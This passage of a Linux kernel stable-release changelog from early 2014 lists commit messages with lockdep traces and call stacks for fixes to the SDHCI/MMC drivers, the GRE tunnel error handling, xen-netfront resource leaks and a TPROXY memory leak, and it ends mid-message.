Sometimes we may meet the following lockdep issue.
The root cause is .set\_clock callback is executed with spin\_lock\_irqsave
in sdhci\_do\_set\_ios. However, the IMX set\_clock callback will try to access
clk\_get\_rate which is using a mutex lock.
The fix avoids access mutex in .set\_clock callback by initializing the
pltfm\_host->clock at probe time and use it later instead of calling
clk\_get\_rate again in atomic context.
[ INFO: HARDIRQ-safe -> HARDIRQ-unsafe lock order detected ]
3.13.0-rc1+ #285 Not tainted
------------------------------------------------------
kworker/u8:1/29 [HC0[0]:SC0[0]:HE0:SE1] is trying to acquire:
(prepare\_lock){+.+...}, at: [<80480b08>] clk\_prepare\_lock+0x44/0xe4
and this task is already holding:
(&(&host->lock)->rlock#2){-.-...}, at: [<804611f4>] sdhci\_do\_set\_ios+0x20/0x720
which would create a new lock dependency:
(&(&host->lock)->rlock#2){-.-...} -> (prepare\_lock){+.+...}
but this new dependency connects a HARDIRQ-irq-safe lock:
(&(&host->lock)->rlock#2){-.-...}
... which became HARDIRQ-irq-safe at:
[<8005f030>] mark\_lock+0x140/0x6ac
[<80060760>] \_\_lock\_acquire+0xb30/0x1cbc
[<800620d0>] lock\_acquire+0x70/0x84
[<8061d2f0>] \_raw\_spin\_lock+0x30/0x40
[<80460668>] sdhci\_irq+0x24/0xa68
[<8006b1d4>] handle\_irq\_event\_percpu+0x54/0x18c
[<8006b350>] handle\_irq\_event+0x44/0x64
[<8006e50c>] handle\_fasteoi\_irq+0xa0/0x170
[<8006a8f0>] generic\_handle\_irq+0x30/0x44
[<8000f238>] handle\_IRQ+0x54/0xbc
[<8000864c>] gic\_handle\_irq+0x30/0x64
[<80013024>] \_\_irq\_svc+0x44/0x5c
[<80614c58>] printk+0x38/0x40
[<804622a8>] sdhci\_add\_host+0x844/0xbcc
[<80464948>] sdhci\_esdhc\_imx\_probe+0x378/0x67c
[<8032ee88>] platform\_drv\_probe+0x20/0x50
[<8032d48c>] driver\_probe\_device+0x118/0x234
[<8032d690>] \_\_driver\_attach+0x9c/0xa0
[<8032b89c>] bus\_for\_each\_dev+0x68/0x9c
[<8032cf44>] driver\_attach+0x20/0x28
[<8032cbc8>] bus\_add\_driver+0x148/0x1f4
[<8032dce0>] driver\_register+0x80/0x100
[<8032ee54>] \_\_platform\_driver\_register+0x50/0x64
[<8084b094>] sdhci\_esdhc\_imx\_driver\_init+0x18/0x20
[<80008980>] do\_one\_initcall+0x108/0x16c
[<8081cca4>] kernel\_init\_freeable+0x10c/0x1d0
[<80611c50>] kernel\_init+0x10/0x120
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
to a HARDIRQ-irq-unsafe lock:
(prepare\_lock){+.+...}
... which became HARDIRQ-irq-unsafe at:
... [<8005f030>] mark\_lock+0x140/0x6ac
[<8005f604>] mark\_held\_locks+0x68/0x12c
[<8005f780>] trace\_hardirqs\_on\_caller+0xb8/0x1d8
[<8005f8b4>] trace\_hardirqs\_on+0x14/0x18
[<8061a130>] mutex\_trylock+0x180/0x20c
[<80480ad8>] clk\_prepare\_lock+0x14/0xe4
[<804816a4>] clk\_notifier\_register+0x28/0xf0
[<80015120>] twd\_clk\_init+0x50/0x68
[<80008980>] do\_one\_initcall+0x108/0x16c
[<8081cca4>] kernel\_init\_freeable+0x10c/0x1d0
[<80611c50>] kernel\_init+0x10/0x120
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
other info that might help us debug this:
Possible interrupt unsafe locking scenario:
CPU0 CPU1
---- ----
lock(prepare\_lock);
local\_irq\_disable();
lock(&(&host->lock)->rlock#2);
lock(prepare\_lock);
lock(&(&host->lock)->rlock#2);
\*\*\* DEADLOCK \*\*\*
3 locks held by kworker/u8:1/29:
#0: (kmmcd){.+.+.+}, at: [<8003db18>] process\_one\_work+0x128/0x468
#1: ((&(&host->detect)->work)){+.+.+.}, at: [<8003db18>] process\_one\_work+0x128/0x468
#2: (&(&host->lock)->rlock#2){-.-...}, at: [<804611f4>] sdhci\_do\_set\_ios+0x20/0x720
the dependencies between HARDIRQ-irq-safe lock and the holding lock:
-> (&(&host->lock)->rlock#2){-.-...} ops: 330 {
IN-HARDIRQ-W at:
[<8005f030>] mark\_lock+0x140/0x6ac
[<80060760>] \_\_lock\_acquire+0xb30/0x1cbc
[<800620d0>] lock\_acquire+0x70/0x84
[<8061d2f0>] \_raw\_spin\_lock+0x30/0x40
[<80460668>] sdhci\_irq+0x24/0xa68
[<8006b1d4>] handle\_irq\_event\_percpu+0x54/0x18c
[<8006b350>] handle\_irq\_event+0x44/0x64
[<8006e50c>] handle\_fasteoi\_irq+0xa0/0x170
[<8006a8f0>] generic\_handle\_irq+0x30/0x44
[<8000f238>] handle\_IRQ+0x54/0xbc
[<8000864c>] gic\_handle\_irq+0x30/0x64
[<80013024>] \_\_irq\_svc+0x44/0x5c
[<80614c58>] printk+0x38/0x40
[<804622a8>] sdhci\_add\_host+0x844/0xbcc
[<80464948>] sdhci\_esdhc\_imx\_probe+0x378/0x67c
[<8032ee88>] platform\_drv\_probe+0x20/0x50
[<8032d48c>] driver\_probe\_device+0x118/0x234
[<8032d690>] \_\_driver\_attach+0x9c/0xa0
[<8032b89c>] bus\_for\_each\_dev+0x68/0x9c
[<8032cf44>] driver\_attach+0x20/0x28
[<8032cbc8>] bus\_add\_driver+0x148/0x1f4
[<8032dce0>] driver\_register+0x80/0x100
[<8032ee54>] \_\_platform\_driver\_register+0x50/0x64
[<8084b094>] sdhci\_esdhc\_imx\_driver\_init+0x18/0x20
[<80008980>] do\_one\_initcall+0x108/0x16c
[<8081cca4>] kernel\_init\_freeable+0x10c/0x1d0
[<80611c50>] kernel\_init+0x10/0x120
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
IN-SOFTIRQ-W at:
[<8005f030>] mark\_lock+0x140/0x6ac
[<80060204>] \_\_lock\_acquire+0x5d4/0x1cbc
[<800620d0>] lock\_acquire+0x70/0x84
[<8061d40c>] \_raw\_spin\_lock\_irqsave+0x40/0x54
[<8045e4a4>] sdhci\_tasklet\_finish+0x1c/0x120
[<8002b538>] tasklet\_action+0xa0/0x15c
[<8002b778>] \_\_do\_softirq+0x118/0x290
[<8002bcf4>] irq\_exit+0xb4/0x10c
[<8000f240>] handle\_IRQ+0x5c/0xbc
[<8000864c>] gic\_handle\_irq+0x30/0x64
[<80013024>] \_\_irq\_svc+0x44/0x5c
[<80614c58>] printk+0x38/0x40
[<804622a8>] sdhci\_add\_host+0x844/0xbcc
[<80464948>] sdhci\_esdhc\_imx\_probe+0x378/0x67c
[<8032ee88>] platform\_drv\_probe+0x20/0x50
[<8032d48c>] driver\_probe\_device+0x118/0x234
[<8032d690>] \_\_driver\_attach+0x9c/0xa0
[<8032b89c>] bus\_for\_each\_dev+0x68/0x9c
[<8032cf44>] driver\_attach+0x20/0x28
[<8032cbc8>] bus\_add\_driver+0x148/0x1f4
[<8032dce0>] driver\_register+0x80/0x100
[<8032ee54>] \_\_platform\_driver\_register+0x50/0x64
[<8084b094>] sdhci\_esdhc\_imx\_driver\_init+0x18/0x20
[<80008980>] do\_one\_initcall+0x108/0x16c
[<8081cca4>] kernel\_init\_freeable+0x10c/0x1d0
[<80611c50>] kernel\_init+0x10/0x120
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
INITIAL USE at:
[<8005f030>] mark\_lock+0x140/0x6ac
[<8005ff0c>] \_\_lock\_acquire+0x2dc/0x1cbc
[<800620d0>] lock\_acquire+0x70/0x84
[<8061d40c>] \_raw\_spin\_lock\_irqsave+0x40/0x54
[<804611f4>] sdhci\_do\_set\_ios+0x20/0x720
[<80461924>] sdhci\_set\_ios+0x30/0x3c
[<8044cea0>] mmc\_power\_up+0x6c/0xd0
[<8044dac4>] mmc\_start\_host+0x60/0x70
[<8044eb3c>] mmc\_add\_host+0x60/0x88
[<8046225c>] sdhci\_add\_host+0x7f8/0xbcc
[<80464948>] sdhci\_esdhc\_imx\_probe+0x378/0x67c
[<8032ee88>] platform\_drv\_probe+0x20/0x50
[<8032d48c>] driver\_probe\_device+0x118/0x234
[<8032d690>] \_\_driver\_attach+0x9c/0xa0
[<8032b89c>] bus\_for\_each\_dev+0x68/0x9c
[<8032cf44>] driver\_attach+0x20/0x28
[<8032cbc8>] bus\_add\_driver+0x148/0x1f4
[<8032dce0>] driver\_register+0x80/0x100
[<8032ee54>] \_\_platform\_driver\_register+0x50/0x64
[<8084b094>] sdhci\_esdhc\_imx\_driver\_init+0x18/0x20
[<80008980>] do\_one\_initcall+0x108/0x16c
[<8081cca4>] kernel\_init\_freeable+0x10c/0x1d0
[<80611c50>] kernel\_init+0x10/0x120
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
}
... key at: [<80e040e8>] \_\_key.26952+0x0/0x8
... acquired at:
[<8005eb60>] check\_usage+0x3d0/0x5c0
[<8005edac>] check\_irq\_usage+0x5c/0xb8
[<80060d38>] \_\_lock\_acquire+0x1108/0x1cbc
[<800620d0>] lock\_acquire+0x70/0x84
[<8061a210>] mutex\_lock\_nested+0x54/0x3c0
[<80480b08>] clk\_prepare\_lock+0x44/0xe4
[<8048188c>] clk\_get\_rate+0x14/0x64
[<8046374c>] esdhc\_pltfm\_set\_clock+0x20/0x2a4
[<8045d70c>] sdhci\_set\_clock+0x4c/0x498
[<80461518>] sdhci\_do\_set\_ios+0x344/0x720
[<80461924>] sdhci\_set\_ios+0x30/0x3c
[<8044c390>] \_\_mmc\_set\_clock+0x44/0x60
[<8044cd4c>] mmc\_set\_clock+0x10/0x14
[<8044f8f4>] mmc\_init\_card+0x1b4/0x1520
[<80450f00>] mmc\_attach\_mmc+0xb4/0x194
[<8044da08>] mmc\_rescan+0x294/0x2f0
[<8003db94>] process\_one\_work+0x1a4/0x468
[<8003e850>] worker\_thread+0x118/0x3e0
[<80044de0>] kthread+0xd4/0xf0
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
the dependencies between the lock to be acquired and HARDIRQ-irq-unsafe lock:
-> (prepare\_lock){+.+...} ops: 395 {
HARDIRQ-ON-W at:
[<8005f030>] mark\_lock+0x140/0x6ac
[<8005f604>] mark\_held\_locks+0x68/0x12c
[<8005f780>] trace\_hardirqs\_on\_caller+0xb8/0x1d8
[<8005f8b4>] trace\_hardirqs\_on+0x14/0x18
[<8061a130>] mutex\_trylock+0x180/0x20c
[<80480ad8>] clk\_prepare\_lock+0x14/0xe4
[<804816a4>] clk\_notifier\_register+0x28/0xf0
[<80015120>] twd\_clk\_init+0x50/0x68
[<80008980>] do\_one\_initcall+0x108/0x16c
[<8081cca4>] kernel\_init\_freeable+0x10c/0x1d0
[<80611c50>] kernel\_init+0x10/0x120
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
SOFTIRQ-ON-W at:
[<8005f030>] mark\_lock+0x140/0x6ac
[<8005f604>] mark\_held\_locks+0x68/0x12c
[<8005f7c8>] trace\_hardirqs\_on\_caller+0x100/0x1d8
[<8005f8b4>] trace\_hardirqs\_on+0x14/0x18
[<8061a130>] mutex\_trylock+0x180/0x20c
[<80480ad8>] clk\_prepare\_lock+0x14/0xe4
[<804816a4>] clk\_notifier\_register+0x28/0xf0
[<80015120>] twd\_clk\_init+0x50/0x68
[<80008980>] do\_one\_initcall+0x108/0x16c
[<8081cca4>] kernel\_init\_freeable+0x10c/0x1d0
[<80611c50>] kernel\_init+0x10/0x120
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
INITIAL USE at:
[<8005f030>] mark\_lock+0x140/0x6ac
[<8005ff0c>] \_\_lock\_acquire+0x2dc/0x1cbc
[<800620d0>] lock\_acquire+0x70/0x84
[<8061a0c8>] mutex\_trylock+0x118/0x20c
[<80480ad8>] clk\_prepare\_lock+0x14/0xe4
[<80482af8>] \_\_clk\_init+0x1c/0x45c
[<8048306c>] \_clk\_register+0xd0/0x170
[<80483148>] clk\_register+0x3c/0x7c
[<80483b4c>] clk\_register\_fixed\_rate+0x88/0xd8
[<80483c04>] of\_fixed\_clk\_setup+0x68/0x94
[<8084c6fc>] of\_clk\_init+0x44/0x68
[<808202b0>] time\_init+0x2c/0x38
[<8081ca14>] start\_kernel+0x1e4/0x368
[<10008074>] 0x10008074
}
... key at: [<808afebc>] prepare\_lock+0x38/0x48
... acquired at:
[<8005eb94>] check\_usage+0x404/0x5c0
[<8005edac>] check\_irq\_usage+0x5c/0xb8
[<80060d38>] \_\_lock\_acquire+0x1108/0x1cbc
[<800620d0>] lock\_acquire+0x70/0x84
[<8061a210>] mutex\_lock\_nested+0x54/0x3c0
[<80480b08>] clk\_prepare\_lock+0x44/0xe4
[<8048188c>] clk\_get\_rate+0x14/0x64
[<8046374c>] esdhc\_pltfm\_set\_clock+0x20/0x2a4
[<8045d70c>] sdhci\_set\_clock+0x4c/0x498
[<80461518>] sdhci\_do\_set\_ios+0x344/0x720
[<80461924>] sdhci\_set\_ios+0x30/0x3c
[<8044c390>] \_\_mmc\_set\_clock+0x44/0x60
[<8044cd4c>] mmc\_set\_clock+0x10/0x14
[<8044f8f4>] mmc\_init\_card+0x1b4/0x1520
[<80450f00>] mmc\_attach\_mmc+0xb4/0x194
[<8044da08>] mmc\_rescan+0x294/0x2f0
[<8003db94>] process\_one\_work+0x1a4/0x468
[<8003e850>] worker\_thread+0x118/0x3e0
[<80044de0>] kthread+0xd4/0xf0
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
stack backtrace:
CPU: 2 PID: 29 Comm: kworker/u8:1 Not tainted 3.13.0-rc1+ #285
Workqueue: kmmcd mmc\_rescan
Backtrace:
[<80012160>] (dump\_backtrace+0x0/0x10c) from [<80012438>] (show\_stack+0x18/0x1c)
r6:00000000 r5:00000000 r4:8088ecc8 r3:bfa11200
[<80012420>] (show\_stack+0x0/0x1c) from [<80616b14>] (dump\_stack+0x84/0x9c)
[<80616a90>] (dump\_stack+0x0/0x9c) from [<8005ebb4>] (check\_usage+0x424/0x5c0)
r5:80979940 r4:bfa29b44
[<8005e790>] (check\_usage+0x0/0x5c0) from [<8005edac>] (check\_irq\_usage+0x5c/0xb8)
[<8005ed50>] (check\_irq\_usage+0x0/0xb8) from [<80060d38>] (\_\_lock\_acquire+0x1108/0x1cbc)
r8:bfa115e8 r7:80df9884 r6:80dafa9c r5:00000003 r4:bfa115d0
[<8005fc30>] (\_\_lock\_acquire+0x0/0x1cbc) from [<800620d0>] (lock\_acquire+0x70/0x84)
[<80062060>] (lock\_acquire+0x0/0x84) from [<8061a210>] (mutex\_lock\_nested+0x54/0x3c0)
r7:bfa11200 r6:80dafa9c r5:00000000 r4:80480b08
[<8061a1bc>] (mutex\_lock\_nested+0x0/0x3c0) from [<80480b08>] (clk\_prepare\_lock+0x44/0xe4)
[<80480ac4>] (clk\_prepare\_lock+0x0/0xe4) from [<8048188c>] (clk\_get\_rate+0x14/0x64)
r6:03197500 r5:bf0e9aa8 r4:bf827400 r3:808ae128
[<80481878>] (clk\_get\_rate+0x0/0x64) from [<8046374c>] (esdhc\_pltfm\_set\_clock+0x20/0x2a4)
r5:bf0e9aa8 r4:bf0e9c40
[<8046372c>] (esdhc\_pltfm\_set\_clock+0x0/0x2a4) from [<8045d70c>] (sdhci\_set\_clock+0x4c/0x498)
[<8045d6c0>] (sdhci\_set\_clock+0x0/0x498) from [<80461518>] (sdhci\_do\_set\_ios+0x344/0x720)
r8:0000003b r7:20000113 r6:bf0e9d68 r5:bf0e9aa8 r4:bf0e9c40
r3:00000000
[<804611d4>] (sdhci\_do\_set\_ios+0x0/0x720) from [<80461924>] (sdhci\_set\_ios+0x30/0x3c)
r9:00000004 r8:bf131000 r7:bf131048 r6:00000000 r5:bf0e9aa8
r4:bf0e9800
[<804618f4>] (sdhci\_set\_ios+0x0/0x3c) from [<8044c390>] (\_\_mmc\_set\_clock+0x44/0x60)
r5:03197500 r4:bf0e9800
[<8044c34c>] (\_\_mmc\_set\_clock+0x0/0x60) from [<8044cd4c>] (mmc\_set\_clock+0x10/0x14)
r5:00000000 r4:bf0e9800
[<8044cd3c>] (mmc\_set\_clock+0x0/0x14) from [<8044f8f4>] (mmc\_init\_card+0x1b4/0x1520)
[<8044f740>] (mmc\_init\_card+0x0/0x1520) from [<80450f00>] (mmc\_attach\_mmc+0xb4/0x194)
[<80450e4c>] (mmc\_attach\_mmc+0x0/0x194) from [<8044da08>] (mmc\_rescan+0x294/0x2f0)
r5:8065f358 r4:bf0e9af8
[<8044d774>] (mmc\_rescan+0x0/0x2f0) from [<8003db94>] (process\_one\_work+0x1a4/0x468)
r8:00000000 r7:bfa29eb0 r6:bf80dc00 r5:bf0e9af8 r4:bf9e3f00
r3:8044d774
[<8003d9f0>] (process\_one\_work+0x0/0x468) from [<8003e850>] (worker\_thread+0x118/0x3e0)
[<8003e738>] (worker\_thread+0x0/0x3e0) from [<80044de0>] (kthread+0xd4/0xf0)
[<80044d0c>] (kthread+0x0/0xf0) from [<8000e9c8>] (ret\_from\_fork+0x14/0x2c)
r7:00000000 r6:00000000 r5:80044d0c r4:bf9e7f00
Fixes: 0ddf03c mmc: esdhc-imx: parse max-frequency from devicetree
Signed-off-by: Dong Aisheng
Acked-by: Shawn Guo
Tested-by: Philippe De Muyter
Signed-off-by: Chris Ball
Signed-off-by: Greg Kroah-Hartman
commit ee02211febfb1dc0ee77e2b641d48910422ed872
Author: Aisheng Dong
Date: Mon Dec 23 19:13:04 2013 +0800
mmc: sdhci: fix lockdep error in tuning routine
commit 2b35bd83467df6f8284b9148d6f768148c3a5e5f upstream.
The sdhci\_execute\_tuning routine gets lock separately by
disable\_irq(host->irq);
spin\_lock(&host->lock);
It will cause the following lockdep error message since the &host->lock
could also be got in irq context.
Use spin\_lock\_irqsave/spin\_unlock\_restore instead to get rid of
this error message.
[ INFO: inconsistent lock state ]
3.13.0-rc1+ #287 Not tainted
---------------------------------
inconsistent {IN-HARDIRQ-W} -> {HARDIRQ-ON-W} usage.
kworker/u2:1/33 [HC0[0]:SC0[0]:HE1:SE1] takes:
(&(&host->lock)->rlock){?.-...}, at: [<8045f7f4>] sdhci\_execute\_tuning+0x4c/0x710
{IN-HARDIRQ-W} state was registered at:
[<8005f030>] mark\_lock+0x140/0x6ac
[<80060760>] \_\_lock\_acquire+0xb30/0x1cbc
[<800620d0>] lock\_acquire+0x70/0x84
[<8061d1c8>] \_raw\_spin\_lock+0x30/0x40
[<804605cc>] sdhci\_irq+0x24/0xa68
[<8006b1d4>] handle\_irq\_event\_percpu+0x54/0x18c
[<8006b350>] handle\_irq\_event+0x44/0x64
[<8006e50c>] handle\_fasteoi\_irq+0xa0/0x170
[<8006a8f0>] generic\_handle\_irq+0x30/0x44
[<8000f238>] handle\_IRQ+0x54/0xbc
[<8000864c>] gic\_handle\_irq+0x30/0x64
[<80013024>] \_\_irq\_svc+0x44/0x5c
[<80329bf4>] dev\_vprintk\_emit+0x50/0x58
[<80329c24>] dev\_printk\_emit+0x28/0x30
[<80329fec>] \_\_dev\_printk+0x4c/0x90
[<8032a180>] dev\_err+0x3c/0x48
[<802dd4f0>] \_regulator\_get+0x158/0x1cc
[<802dd5b4>] regulator\_get\_optional+0x18/0x1c
[<80461df4>] sdhci\_add\_host+0x42c/0xbd8
[<80464820>] sdhci\_esdhc\_imx\_probe+0x378/0x67c
[<8032ee88>] platform\_drv\_probe+0x20/0x50
[<8032d48c>] driver\_probe\_device+0x118/0x234
[<8032d690>] \_\_driver\_attach+0x9c/0xa0
[<8032b89c>] bus\_for\_each\_dev+0x68/0x9c
[<8032cf44>] driver\_attach+0x20/0x28
[<8032cbc8>] bus\_add\_driver+0x148/0x1f4
[<8032dce0>] driver\_register+0x80/0x100
[<8032ee54>] \_\_platform\_driver\_register+0x50/0x64
[<8084b094>] sdhci\_esdhc\_imx\_driver\_init+0x18/0x20
[<80008980>] do\_one\_initcall+0x108/0x16c
[<8081cca4>] kernel\_init\_freeable+0x10c/0x1d0
[<80611b28>] kernel\_init+0x10/0x120
[<8000e9c8>] ret\_from\_fork+0x14/0x2c
irq event stamp: 805
hardirqs last enabled at (805): [<8061d43c>] \_raw\_spin\_unlock\_irqrestore+0x38/0x4c
hardirqs last disabled at (804): [<8061d2c8>] \_raw\_spin\_lock\_irqsave+0x24/0x54
softirqs last enabled at (570): [<8002b824>] \_\_do\_softirq+0x1c4/0x290
softirqs last disabled at (561): [<8002bcf4>] irq\_exit+0xb4/0x10c
other info that might help us debug this:
Possible unsafe locking scenario:
CPU0
----
lock(&(&host->lock)->rlock);
lock(&(&host->lock)->rlock);
\*\*\* DEADLOCK \*\*\*
2 locks held by kworker/u2:1/33:
#0: (kmmcd){.+.+..}, at: [<8003db18>] process\_one\_work+0x128/0x468
#1: ((&(&host->detect)->work)){+.+...}, at: [<8003db18>] process\_one\_work+0x128/0x468
stack backtrace:
CPU: 0 PID: 33 Comm: kworker/u2:1 Not tainted 3.13.0-rc1+ #287
Workqueue: kmmcd mmc\_rescan
Backtrace:
[<80012160>] (dump\_backtrace+0x0/0x10c) from [<80012438>] (show\_stack+0x18/0x1c)
r6:bfad0900 r5:00000000 r4:8088ecc8 r3:bfad0900
[<80012420>] (show\_stack+0x0/0x1c) from [<806169ec>] (dump\_stack+0x84/0x9c)
[<80616968>] (dump\_stack+0x0/0x9c) from [<806147b4>] (print\_usage\_bug+0x260/0x2d0)
r5:8076ba88 r4:80977410
[<80614554>] (print\_usage\_bug+0x0/0x2d0) from [<8005f0d0>] (mark\_lock+0x1e0/0x6ac)
r9:8005e678 r8:00000000 r7:bfad0900 r6:00001015 r5:bfad0cd0
r4:00000002
[<8005eef0>] (mark\_lock+0x0/0x6ac) from [<80060234>] (\_\_lock\_acquire+0x604/0x1cbc)
[<8005fc30>] (\_\_lock\_acquire+0x0/0x1cbc) from [<800620d0>] (lock\_acquire+0x70/0x84)
[<80062060>] (lock\_acquire+0x0/0x84) from [<8061d1c8>] (\_raw\_spin\_lock+0x30/0x40)
r7:00000000 r6:bfb63000 r5:00000000 r4:bfb60568
[<8061d198>] (\_raw\_spin\_lock+0x0/0x40) from [<8045f7f4>] (sdhci\_execute\_tuning+0x4c/0x710)
r4:bfb60000
[<8045f7a8>] (sdhci\_execute\_tuning+0x0/0x710) from [<80453454>] (mmc\_sd\_init\_card+0x5f8/0x660)
[<80452e5c>] (mmc\_sd\_init\_card+0x0/0x660) from [<80453748>] (mmc\_attach\_sd+0xb4/0x180)
r9:bf92d400 r8:8065f364 r7:00061a80 r6:bfb60000 r5:8065f358
r4:bfb60000
[<80453694>] (mmc\_attach\_sd+0x0/0x180) from [<8044d9f8>] (mmc\_rescan+0x284/0x2f0)
r5:8065f358 r4:bfb602f8
[<8044d774>] (mmc\_rescan+0x0/0x2f0) from [<8003db94>] (process\_one\_work+0x1a4/0x468)
r8:00000000 r7:bfb55eb0 r6:bf80dc00 r5:bfb602f8 r4:bfb35980
r3:8044d774
[<8003d9f0>] (process\_one\_work+0x0/0x468) from [<8003e850>] (worker\_thread+0x118/0x3e0)
[<8003e738>] (worker\_thread+0x0/0x3e0) from [<80044de0>] (kthread+0xd4/0xf0)
[<80044d0c>] (kthread+0x0/0xf0) from [<8000e9c8>] (ret\_from\_fork+0x14/0x2c)
r7:00000000 r6:00000000 r5:80044d0c r4:bfb37b40
Signed-off-by: Dong Aisheng
Signed-off-by: Chris Ball
Signed-off-by: Greg Kroah-Hartman
commit 8a6551ad7cd0751319efbc75e0b5ad884cb06fdb
Author: David Cohen
Date: Tue Oct 29 10:58:27 2013 -0700
mmc: sdhci-pci: add broken HS200 quirk for Intel Merrifield
commit 390145f9adcf2730fcee81c8a51fd7c6c08f705f upstream.
Due to unknown hw issue so far, Merrifield is unable to enable HS200
support. This patch adds quirk to avoid SDHCI to initialize with error
below:
[ 53.850132] CPU: 0 PID: 0 Comm: swapper/0 Tainted: G W
3.12.0-rc6-00037-g3d7c8d9-dirty #36
[ 53.850150] Hardware name: Intel Corporation Merrifield/SALT BAY,
BIOS 397 2013.09.12:11.51.40
[ 53.850167] 00000000 00000000 ee409e48 c18816d2 00000000 ee409e78
c123e254 c1acc9b0
[ 53.850227] 00000000 00000000 c1b14148 000003de c16c03bf c16c03bf
ee75b480 ed97c54c
[ 53.850282] ee75b480 ee409e88 c123e292 00000009 00000000 ee409ef8
c16c03bf c1207fac
[ 53.850339] Call Trace:
[ 53.850376] [] dump\_stack+0x4b/0x79
[ 53.850408] [] warn\_slowpath\_common+0x84/0xa0
[ 53.850436] [] ? sdhci\_send\_command+0xb4f/0xc50
[ 53.850462] [] ? sdhci\_send\_command+0xb4f/0xc50
[ 53.850490] [] warn\_slowpath\_null+0x22/0x30
[ 53.850516] [] sdhci\_send\_command+0xb4f/0xc50
[ 53.850545] [] ? native\_sched\_clock+0x2c/0xb0
[ 53.850575] [] ? delay\_tsc+0x73/0xb0
[ 53.850601] [] ? \_\_const\_udelay+0x1e/0x20
[ 53.850626] [] ? sdhci\_reset+0x93/0x190
[ 53.850654] [] sdhci\_finish\_data+0xf0/0x2e0
[ 53.850683] [] sdhci\_irq+0x31f/0x930
[ 53.850713] [] ? \_\_buffer\_unlock\_commit+0x10/0x20
[ 53.850740] [] ? trace\_buffer\_unlock\_commit+0x37/0x50
[ 53.850773] [] handle\_irq\_event\_percpu+0x5c/0x220
[ 53.850800] [] ? handle\_fasteoi\_irq+0x16/0xd0
[ 53.850827] [] handle\_irq\_event+0x3a/0x60
[ 53.850852] [] ? unmask\_irq+0x30/0x30
[ 53.850878] [] handle\_fasteoi\_irq+0x4e/0xd0
[ 53.850895]  [] ? do\_IRQ+0x42/0xb0
[ 53.850943] [] ? common\_interrupt+0x31/0x38
[ 53.850973] [] ? cgroup\_mkdir+0x4e8/0x580
[ 53.851001] [] ? default\_idle+0x22/0xf0
[ 53.851029] [] ? arch\_cpu\_idle+0x26/0x30
[ 53.851054] [] ? cpu\_startup\_entry+0x65/0x240
[ 53.851082] [] ? rest\_init+0xb5/0xc0
[ 53.851108] [] ? \_\_read\_lock\_failed+0x18/0x18
[ 53.851138] [] ? start\_kernel+0x31b/0x321
[ 53.851164] [] ? repair\_env\_string+0x51/0x51
[ 53.851190] [] ? i386\_start\_kernel+0x139/0x13c
[ 53.851209] ---[ end trace 92777f5fe48d33f2 ]---
[ 53.853449] mmcblk0: error -84 transferring data, sector 11142162, nr
304, cmd response 0x0, card status 0x0
[ 53.853476] mmcblk0: retrying using single block read
[ 55.937863] sdhci: Timeout waiting for Buffer Read Ready interrupt
during tuning procedure, falling back to fixed sampling clock
[ 56.207951] sdhci: Timeout waiting for Buffer Read Ready interrupt
during tuning procedure, falling back to fixed sampling clock
[ 66.228785] mmc0: Timeout waiting for hardware interrupt.
[ 66.230855] ------------[ cut here ]------------
Signed-off-by: David Cohen
Reviewed-by: Chuanxiao Dong
Acked-by: Dong Aisheng
Signed-off-by: Chris Ball
Signed-off-by: Greg Kroah-Hartman
commit a5891096c1e99013f0fab10eb353d855988392d1
Author: David Cohen
Date: Tue Oct 29 10:58:26 2013 -0700
mmc: sdhci: add quirk for broken HS200 support
commit 13868bf20f2f2c305f96e23620b024e167d6f9cb upstream.
This patch defines a quirk for platforms unable to enable HS200 support.
Signed-off-by: David Cohen
Reviewed-by: Chuanxiao Dong
Acked-by: Dong Aisheng
Signed-off-by: Chris Ball
Signed-off-by: Greg Kroah-Hartman
commit c8579f3216b25a0c5adf473b2e1cbbb3f908fa4c
Author: Duan Jiong
Date: Tue Jan 28 11:49:43 2014 +0800
net: gre: use icmp\_hdr() to get inner ip header
[ Upstream commit c0c0c50ff7c3e331c90bab316d21f724fb9e1994 ]
When dealing with icmp messages, the skb->data points the
ip header that triggered the sending of the icmp message.
In gre\_cisco\_err(), the parse\_gre\_header() is called, and the
iptunnel\_pull\_header() is called to pull the skb at the end of
the parse\_gre\_header(), so the skb->data doesn't point the
inner ip header.
Unfortunately, the ipgre\_err still needs those ip addresses in
inner ip header to look up tunnel by ip\_tunnel\_lookup().
So just use icmp\_hdr() to get inner ip header instead of skb->data.
Signed-off-by: Duan Jiong
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit b84c36cb8ca10bdfc0ee8f3e1e74eaeb4010756c
Author: Annie Li
Date: Tue Jan 28 11:35:42 2014 +0800
xen-netfront: fix resource leak in netfront
[ Upstream commit cefe0078eea52af17411eb1248946a94afb84ca5 ]
This patch removes grant transfer releasing code from netfront, and uses
gnttab\_end\_foreign\_access to end grant access since
gnttab\_end\_foreign\_access\_ref may fail when the grant entry is
currently used for reading or writing.
\* clean up grant transfer code kept from old netfront(2.6.18) which grants
pages for access/map and transfer. But grant transfer is deprecated in current
netfront, so remove corresponding release code for transfer.
\* fix resource leak, release grant access (through gnttab\_end\_foreign\_access)
and skb for tx/rx path, use get\_page to ensure page is released when grant
access is completed successfully.
Xen-blkfront/xen-tpmfront/xen-pcifront also have similar issue, but patches
for them will be created separately.
V6: Correct subject line and commit message.
V5: Remove unecessary change in xennet\_end\_access.
V4: Revert put\_page in gnttab\_end\_foreign\_access, and keep netfront change in
single patch.
V3: Changes as suggestion from David Vrabel, ensure pages are not freed untill
grant acess is ended.
V2: Improve patch comments.
Signed-off-by: Annie Li
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 0fdedfaac984ec03e8012362fdbd2f2aab77a4ac
Author: Holger Eitzenberger
Date: Mon Jan 27 10:33:18 2014 +0100
net: Fix memory leak if TPROXY used with TCP early demux
[ Upstream commit a452ce345d63ddf92cd101e4196569f8718ad319 ]
I see a memory leak when using a transparent HTTP proxy using TPROXY
together with TCP early demux and Kernel v3.8.13.15 (Ubuntu stable):
unreferenced object 0xffff88008cba4a40 (size 1696):
comm "softirq", pid 0, jiffies 4294944115 (age 8907.520s)
hex dump (first 32 bytes):
